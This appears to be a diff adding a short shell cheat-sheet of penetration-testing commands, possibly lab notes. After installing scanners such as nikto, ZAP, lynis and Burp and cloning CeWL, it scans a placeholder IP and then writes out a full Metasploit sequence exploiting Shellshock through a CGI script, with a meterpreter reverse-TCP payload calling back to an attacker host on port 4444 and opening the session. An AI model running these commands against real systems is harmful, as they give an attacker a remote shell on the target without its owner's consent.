@@ -1,0 +1,25 @@
+sudo apt update
+sudo apt upgrade -y
+sudo apt install nikto -y
+sudo apt install zaproxy -y
+sudo apt install lynis -y
+sudo apt install burpsuite -y
+git clone https://github.com/digininja/CeWL.git
+cd CeWL
+ruby cewl.rb -h
+nikto -h http://xxxxxxxxxx(ip)
+zaproxy
+sudo lynis audit system
+sudo systemctl start postgresql
+msfdb init
+msfconsole
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+show options
+set RHOSTS xxxxxxxxxx(ip)
+set RPORT 80
+set TARGETURI /cgi-bin/test.cgi
+set LHOST xxxxxxxxxx(ip)
+set LPORT 4444
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+run
+sessions
